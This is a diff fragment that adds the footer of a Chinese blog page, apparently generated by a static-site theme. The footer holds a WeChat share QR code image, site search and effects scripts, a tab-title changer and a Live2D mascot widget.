+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACM0lEQVR42u3aMW7EMAwEwPv/py9NigMCK0vSCWBpXAXOQfa4IESuXq/4en9cP+983k/++/mb9VNuvjAwMB7LeC+v9QPWj7xaZ01af6xLKgYGxgGMfOnkwUkB7T338j4GBgZGsF2rbunyQo+BgYEx2a71NoLrRhcDAwNj0sT2xmTJYG79+W7uxTEwMB7IyLdx///3n+QbGBgYj2K8i1eyXUvK5V3v870aBgbG1ozqKC2JNieNa77tw8DAOIeRH97Kh2vV8prc+eWXGBgYBzCqpbN6dCxZP3ndy99jYGAcxqiGiHmQ0BuoRSUbAwNja8Y8aKzGjfODHeU8FgMD4+GMarmcDMiqWeQNRRYDA2MLRnUjmCxXjRB6ny8aumFgYGzE6A28qg3tqJjGW1gMDIz9GPOHrZvb6n/ztjmKMDEwMLZgTCLJvAT3Bm3VQoyBgbE3o/pyeZPZizwnhzMwMDD2ZvTc1eCzGgzkBR0DA2NXRj4a6x2SyCOBHhUDA+MExnrT1jvmNX/dZluLgYFxAKM3ms9Lc9LKViOEy5QDAwNjU0Yy8Mrb2mpT2vsEr8nrYmBgPJDRG4T1Is8qL2JjYGBsypg0rslwLXnp+cgPAwNjb8ZkHJ+P0hLkPGzAwMDYmzEJAPJgIG+JmwUXAwPjAEbvIEWv9Z2viYGBgdF7zF1BQrXEY2BgYKwXzcd2yTqTWAIDA+MERh4G9EZs1WlffigNAwPjBEa1dVwX6LsCgxyGgYGxNeMLoWMNyxlU5AMAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '你去哪啦！(｡•ˇ‸ˇ•｡)';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来！( • ̀ω•́ )✧';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":180},"mobile":{"show":true},"log":false});</script></body>
+</html>
